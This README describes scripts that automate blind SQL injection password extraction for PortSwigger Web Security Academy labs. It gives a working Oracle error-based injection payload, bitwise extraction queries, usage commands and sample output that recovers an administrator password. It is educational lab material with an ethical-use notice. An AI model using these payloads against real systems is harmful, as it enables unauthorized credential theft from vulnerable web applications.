# Blind SQL Injection Extractors

![Python](https://img.shields.io/badge/Python-3.8+-blue)
![License](https://img.shields.io/badge/License-MIT-green)
![Topic](https://img.shields.io/badge/Topic-Web%20Security-orange)

Automated password extractors for **PortSwigger Web Security Academy** labs,
covering two blind SQL injection classes:

| Script | Lab technique | Oracle signal |
|---|---|---|
| `blind_sqli_extract.py` | Blind SQLi with conditional responses | `Welcome back` present/absent |
| `oracle_error_based_brute.py` | Visible error-based SQLi (Oracle) | `ORA-01476` / HTTP 500 |

## The vulnerability

The application tracks users with a cookie and embeds its value directly
into a SQL query. Depending on the lab, the response either changes content
(conditional response) or leaks a database error (error-based), acting as a
**boolean oracle**:

| Injected condition | Conditional-response lab | Error-based lab (Oracle) |
|---|---|---|
| TRUE  | Page contains `Welcome back` | `ORA-01476: divisor is equal to zero` / HTTP 500 |
| FALSE | `Welcome back` absent | Normal page |

### Error-based payload anatomy (Oracle)

```sql
xyz'||(SELECT CASE WHEN (ASCII(SUBSTR(password, 1, 1)) > 109)
      THEN TO_CHAR(1/0) ELSE '' END
      FROM users WHERE username = 'administrator')||'
```

| Fragment | Purpose |
|---|---|
| `xyz'` | Terminates the original string literal |
| `\|\|(SELECT ...)\|\|` | Concatenates the subquery result into the string context |
| `CASE WHEN (COND) THEN TO_CHAR(1/0) ELSE '' END` | Errors only when COND is TRUE |
| `FROM users WHERE username = 'administrator'` | Restricts to a single row (avoids `ORA-01427`) |

## Speed: parallel bitwise extraction

Each character's ASCII code is recovered with 7 **independent** bitwise
queries instead of 7 sequential binary-search steps, so they run in parallel:

```sql
-- error-based lab (Oracle)
BITAND(ASCII(SUBSTR(password, 1, 1)), 64) > 0

-- conditional-response lab
SELECT (ASCII(SUBSTRING((SELECT Password FROM Users
     WHERE Username = 'Administrator'), 1, 1)) & 64) > 0
```

| Strategy | Requests | Wall time (typical) |
|---|---|---|
| Intruder cluster bomb (linear) | ~720 | manual |
| Sequential binary search | ~165 | ~50s |
| **Parallel bitwise (this repo)** | ~165 | **~5-10s** |

## Reliability features

Blind oracles are noisy — a single throttled response can silently corrupt a
character. Both scripts defend against this:

1. **Sanity/self-test** — `1=1` must signal TRUE, `1=2` must signal FALSE,
   before any extraction starts.
2. **Length detection with majority-vote verification** — the binary-searched
   length is confirmed with 3 parallel votes and re-searched on disagreement.
3. **Per-character verification** — every character is confirmed with an `=`
   comparison; failures trigger sequential re-extraction.
4. **Canary checks** — `1=1`/`1=2` probes run whenever an inconsistency is
   seen, pausing until the server behaves again.
5. **Transient-error retry** — timeouts, 429s and 503s are retried with
   backoff instead of counting as FALSE.
6. **Auto-extension** — extraction stops on `LENGTH(...) > n`, not on a
   possibly-truncated length estimate; extra positions are appended
   automatically.
7. **Final full-string verification** — 3-vote check that the extracted
   string equals the stored value, with per-position mismatch reporting.

## Usage

```bash
pip install requests
```

### Conditional responses lab

```bash
python3 blind_sqli_extract.py https://YOUR-LAB-ID.web-security-academy.net/ \
    --session YOUR_SESSION_COOKIE_VALUE
```

### Visible error-based lab (Oracle)

```bash
python3 oracle_error_based_brute.py https://YOUR-LAB-ID.web-security-academy.net/ \
    --cookie TrackingId
```

Common options for both:

| Flag | Purpose |
|---|---|
| `--workers N` | Parallel requests (default 4 / 8) |
| `--delay S` | Per-request delay inside each worker |
| `--username / --table / --column / --user-col` | Target row/columns |
| `--max-length N` | Safety cap for password length |
| `--debug` | Verbose per-request logging |

Error-based specific:

| Flag | Purpose |
|---|---|
| `--param NAME` | Inject via query parameter instead of cookie |
| `--style and` | Use `AND ... IS NULL --` payload instead of `\|\|` concat |
| `--error-string TEXT` | Custom error marker (default `ORA-01476`) |
| `--raw-cookie` | Disable URL-encoding of cookie payloads |

## Sample output

```
[*] Self-test: TRUE (1=1) must error, FALSE (1=2) must not ...
[+] Self-test passed: boolean signaling works
[*] Finding password length ...
[+] Password length: 20
[*] Extracting 20 chars via parallel bitwise queries ...
[*] Progress: 0nu4jd9py0gue52k1rpq
[*] Final verification: password = '<extracted>' (3 votes) ...
[+] Verified: string matches the stored value exactly

[+] Password (repr): '0nu4jd9py0gue52k1rpq' (20 chars)
[+] Requests: 187 in 7.8s
```

## Repository structure

```
.
├── blind_sqli_extract.py          # conditional-response extractor
├── oracle_error_based_brute.py    # Oracle error-based extractor
├── README.md
├── LICENSE
└── .gitignore
```

## Ethical use

These tools are for **authorized, educational use only** — specifically the
intentionally vulnerable PortSwigger Web Security Academy labs. Do not run
them against systems you do not own or lack explicit written permission to
test. Unauthorized access to computer systems is illegal.

## License

[MIT](LICENSE)
